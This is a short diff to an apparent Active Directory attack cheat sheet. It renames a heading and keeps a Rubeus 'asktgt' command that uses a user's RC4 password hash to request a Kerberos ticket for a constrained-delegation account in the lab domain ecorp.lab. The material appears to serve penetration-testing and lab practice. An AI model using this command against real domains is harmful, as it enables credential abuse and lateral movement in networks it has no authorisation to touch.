@@ -729,7 +729,7 @@ Or using ActiveDirectory module:
 
 * * *
 
-#### Requesting a (constrained delegation) TGT:
+#### Requesting an initial User or MachineAccount (possessing constrained delegation) TGT:
 Use ```/outfile:``` or ```/nowrap``` if copy pasting - 
  
 ```./Rubeus.exe asktgt /domain:ecorp.lab /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /outfile:C:\Temp\webtgt.kirbi```
